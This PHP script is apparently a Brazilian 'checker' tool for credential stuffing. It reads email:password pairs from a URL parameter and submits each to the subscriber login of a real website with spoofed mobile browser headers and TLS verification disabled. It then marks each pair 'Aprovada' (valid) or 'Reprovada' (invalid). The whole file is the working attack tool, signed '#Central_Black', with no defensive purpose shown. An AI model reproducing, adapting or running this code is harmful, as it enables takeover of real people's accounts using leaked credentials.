<?php
error_reporting(0);

if (file_exists (getcwd ().'/cookie.txt')){
		unlink (getcwd ().'/cookie.txt');
}
function multiexplode($delimiters, $string) {
	$one = str_replace($delimiters, $delimiters[0], $string);
	$two = explode($delimiters[0], $one);
	return $two;
}

$lista = $_GET['lista'];
$email= multiexplode(array(":", "|", "»",";"), $lista)[0];
$senha= multiexplode(array(":", "|", "»",";"), $lista)[1];



function getstr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$ch = curl_init();
curl_setopt ($ch,CURLOPT_URL,'https://www.tufos.com.br/');
curl_setopt ($ch,CURLOPT_CUSTOMREQUEST,"GET");
curl_setopt ($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt ($ch,CURLOPT_FOLLOWLOCATION,1);
curl_setopt ($ch,CURLOPT_HTTPHEADER,array (
'Host: www.tufos.com.br',
'Connection: keep-alive',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-G600FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
'Referer: https://www.google.com/',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
));
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt ($ch,CURLOPT_SSL_VERIFYHOST,0);

$exe =curl_exec ($ch);


$ch = curl_init();
curl_setopt ($ch,CURLOPT_URL,'https://assinantes.tufos.com.br/m/login/');
curl_setopt ($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt ($ch,CURLOPT_FOLLOWLOCATION,1);
curl_setopt ($ch,CURLOPT_HTTPHEADER,array (
'Host: assinantes.tufos.com.br',

'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-G600FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
'Referer: https://www.tufos.com.br/',

'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
));
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt ($ch,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt ($ch,CURLOPT_POSTFIELDS,'email='. $email.'&senha='. $senha.'&email-senha=');
$exe2 =curl_exec ($ch);

$res = getstr ($exe2,'<p class="erroLogin">','</p>');
$ap = getstr ($exe2,'<form id="','"');

if (strpos ($res,'E-mail incorreto ou Senha incorreta!')!==false){
   echo "<span style ='background-color:red; color: black; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600'>Reprovada</span> <span style='color:red;'> EMAIL: $email SENHA:$senha  Retorno: Email ou senha incorreto</span>";


}
else if (strpos ($res,'Esse assinante j')!==false){
	echo "<span style ='background-color:red; color: black; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600'>Reprovada</span> <span style='color:red;'> EMAIL: $email SENHA:$senha  Retorno: Email ou senha incorreto</span>";


}else {
	

	echo"<br><span style='background: linear-gradient(to right, rgb(244, 238, 66) 0%, rgb(220, 244, 66)0%, rgb(66, 244, 235) 100%);
		; color: black; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600;'>Aprovada</span><span style='color:white'>  EMAIL: $email  SENHA:$senha </span><span class='label label-info' style='color: white'> </span> <span style='background: linear-gradient(to right, rgb(244, 238, 66) 0%, rgb(220, 244, 66)0%, rgb(66, 244, 235) 100%);, whiteolor: white; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600;'>#Central_Black</span>";

}

?>